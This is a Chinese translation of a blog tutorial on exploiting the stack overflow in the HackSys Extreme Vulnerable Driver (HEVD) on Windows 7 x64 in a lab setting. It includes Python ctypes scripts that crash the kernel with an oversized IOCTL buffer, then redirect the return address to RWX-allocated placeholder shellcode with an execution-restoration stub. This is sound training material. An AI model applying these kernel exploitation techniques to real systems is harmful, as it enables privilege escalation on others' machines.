> 文章翻译自：
## 介绍
继续我们的Windows漏洞利用之旅，开始学习HEVD中内核驱动程序相关的漏洞，并编写有关ring
0的利用程序。正如我在[OSCP](https://h0mbre.github.io/OSCP/)中所做的准备，我主要是在博客中记录自己的进步，以此来加强认知和保留详细的笔记，以供日后参考。
本系列文章是我尝试遍历[Hacksys
Extreme漏洞驱动程序](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)中所有漏洞方法的记录。  
**我将使用HEVD 2.0。** ，对我们这些刚入门的人来说，像这样的训练工具是非常神奇的。 那里还有很多不错的博客文章，介绍了各种HEVD漏洞。
我建议您全部阅读！ 在尝试完成这些攻击时，我大量引用了它们。 在此博客中，我所做的或说的，几乎没有什么是新的内容或我自己的想法/思路/技术。
### **本系列文章不再着重介绍以下信息，例如：**
>   * 驱动程序如何工作，以及用户空间，内核和驱动程序之间的不同类型，如何通信等等
>
>   * 如何安装HEVD
>
>   * 如何搭建实验环境
>
>   * shellcode分析
>
>
原因很简单，其他博客文章在详细说明此信息方面，做得比我更好。 那里有很多出色的帖子，相比之下我写这个博客系列就很肤浅了。
但并不意味着我的博客写得很差，因为我的博客比那些文章更容易理解。那些博客的作者比我有更多的经验和更渊博的知识，他们文章解释的就很好。:)
这篇文章/系列文章将重点放在我尝试制作实际漏洞的经验上。
我使用以下博客作为参考：
>   * [@r0otki7的内核驱动程序安装和实验环境搭建](https://rootkits.xyz/blog/2017/06/kernel-> setting-up/),
>
>   * [@r0otki7的Win7 x86 HEVD 栈溢出](https://rootkits.xyz/blog/2017/08/kernel-> stack-overflow/),
>
>   * [@33y0re的Win7 x86 HEVD
> 栈溢出](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/),
>
>   * [@_xpn_的Win10 x64 HEVD 栈溢出](https://blog.xpnsec.com/hevd-stack-> overflow/),
>
>   * @sizzop的基于HEVD 栈溢出的[bug](https://sizzop.github.io/2016/07/06/kernel-> hacking-with-hevd-part-2.html),
> [shellcode](https://sizzop.github.io/2016/07/07/kernel-hacking-with-hevd-> part-3.html), 和 [exploit](https://sizzop.github.io/2016/07/08/kernel-> hacking-with-hevd-part-4.html),
>
>   * [@ctf_blahcat的Win8.1 x64 HEVD
> 栈溢出](https://blahcat.github.io/2017/08/18/first-exploit-in-windows-kernel-> hevd/),
>
>   *
> [@abatchy17’的x86和x64环境下利用Token窃取Shellcode](https://www.abatchy.com/2018/01/kernel-> exploitation-2),
>
>   *
> [@hasherezade的HEVD博客文章](https://hshrzd.wordpress.com/2017/06/05/starting-> with-windows-kernel-exploitation-part-2/).
>
>
非常感谢这些博客作者，没有您的帮助，我无法完成前两个漏洞。
## 目标
我们的目标是在Win7 x86和Win7 x86-64上完成针对HEVD栈溢出漏洞的攻击。我们将紧跟上篇博客文章，大多数内容将不会重新介绍。
我们将使用与上一篇文章相同的方法，并进行一些更改，这些更改将是：
>   * 这次使用`VirtualAlloc`代替`VirtualProtect`，
>   * 我们需要在某些地方修改脚本以使用64位的寄存器，
>   * @ abatchy17提供的新的tpken-stealing shellcodef方法，
>   * 新的内核执行恢复shellcode方法
>   * 一种新的`ctypes`库
>
让我们开始吧。
## 使64位系统Crash
* * *
为了进入函数`TriggerStackOverflow`，我们将再次使用值为`0x222003`的IOCTL，并且`CreateFileA`
API看起来完全相同，将再次向设备的驱动程序返回一个句柄。我们使用该句柄调用`DeviceIoControl`API，发送一个较大的缓冲区来使系统崩溃。
为了创建缓冲区，我们将使用`ctypes`库中`create_string_buffer`函数，该功能是我从@sizzop博客文章中学到的。（在上一篇文章中，我们主要侧重@r0otki7的文章，在这篇文章中，我主要侧重@sizzop的。）
与上次一样，我们将首先发送一个3,000个字节的`"A"`字符到缓冲区，然后系统会崩溃。我们的代码如下所示：
    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
    import time
    kernel32 = windll.kernel32
    hevd = kernel32.CreateFileA(
            "\\\\.\\HackSysExtremeVulnerableDriver", 
            0xC0000000, 
            0, 
            None, 
            0x3, 
            0, 
            None)
    if (not hevd) or (hevd == -1):
        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
        sys.exit(1)
    else:
        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
    buf = create_string_buffer("A"*3000)
    result = kernel32.DeviceIoControl(
        hevd,
        0x222003,
        addressof(buf),
        (len(buf)-1),
        None,
        0,
        byref(c_ulong()),
        None
    )
    if result != 0:
            print("[*] Sending payload to driver...")
    else:
        print("[!] Unable to send payload to driver.")
        sys.exit(1)
这里的一个棘手的事情是，创建`create_string_buffer`时，您的缓冲区为`null`终止。它表示比我们发送的长度长了一个字节,
是3001字节长。由于这个原因，在`DeviceIoControl`中，我们从要发送的缓冲区长度中减去了一个字节长度。（感谢HEVD开发人员调试语句，这些语句包含了用户缓冲区的长度！）
受害者的机器运行此命会崩溃。
您可以看到，当程序执行到`TriggerStackOverflow`函数的断点并逐步执行时，我们要进行`ret`操作。因此，我在WinDBG中使用`k`命令查看了堆栈得到返回的地址，可以看到堆栈中充满了我们的`As`。
由于`0x4141414141414141`不是有效的地址，所以在这里肯定会崩溃。
正如您所见，系统崩溃了。我们不仅将一堆值写入堆栈，而且显然会覆盖其他寄存器中的值。我们在这里控制了很多寄存器，这在内核中可能是一件坏事，因为我们要非常具体地确定内存损坏的地址。这些就留给你们去找出需要控制`ret地址`的偏移量。
## 开始漏洞利用
好，现在我们接着做上次的工作。让我们发送指定长度的字符到缓冲区，逐步执行该函数，并查看从`TriggerStackOverflow`返回后执行的指令。在不溢出缓冲区的情况下，我们将遵循以下执行路径：
如您所见，当我们退出`TriggerStackOverflow`并重新输入`StackOverflowIoctlHandler`时，我们执行：
>   * add `rsp`，`0x28`
>
>   * `ret`
>
>
我们的shellcode将需要模拟这些命令，以使我们能够按预期恢复执行并且不会崩溃。 总而言之，我们的执行路径如下所示：  
**无溢出**  
`StackOverflowIoctlHandler` –> `TriggerStackOverflow` –>`ret`
到`StackOverflowIoctlHandler`，然后`add rsp,
0x28`，然后`ret`到->`IrpDeviceIoCtlHandler`.
**有溢出**  
`StackOverflowIoctlHandler` –> `TriggerStackOverflow` –>`ret`到shellcode，然后`add
rsp, 0x28`，然后`ret`到–> `IrpDeviceIoCtlHandler`
我们要做的只是将Shellcode替换为`StackOverflowIoctlHandler`的末尾，然后在shellcode的末尾运行该函数的命令以恢复执行。
让我们在脚本中添加一些shellcode，使用`VirtualAlloc`将其标记为RWX权限，然后发送一些`NOPs`占位指令。
另外，您会在此处看到覆盖`ret`地址的偏移量是`2056`。
现在，我们的漏洞利用代码如下所示：
    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
    import time
    kernel32 = windll.kernel32
    hevd = kernel32.CreateFileA(
            "\\\\.\\HackSysExtremeVulnerableDriver", 
            0xC0000000, 
            0, 
            None, 
            0x3, 
            0, 
            None)
    if (not hevd) or (hevd == -1):
        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
        sys.exit(1)
    else:
        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
    shellcode1 = (
    "\x90" * 100                                               
    )
    restoration_stub = (
    "\x48\x83\xc4\x28"               # add rsp,0x28
    "\xc3"                           # ret
    )
    shellcode = shellcode1 + restoration_stub
    addr = kernel32.VirtualAlloc(
        c_int64(0),
        c_int(len(shellcode)),
        c_int(0x3000),
        c_int(0x40)
    )
    if not addr:
        print("[!] Error allocating shellcode RWX buffer")
    else:
        print("[*] Allocated RWX buffer for shellcode @ {}").format(str(hex(addr)))
    memmove(addr,shellcode,len(shellcode))
    addr = struct.pack("<Q", addr)
    buf = create_string_buffer("A"*2048 + "B"*8 + addr)
    result = kernel32.DeviceIoControl(
        hevd,
        0x222003,
        addressof(buf),
        (len(buf)-1),
        None,
        0,
        byref(c_ulong()),
        None
    )
    if result != 0:
            print("[*] Sending payload to driver...")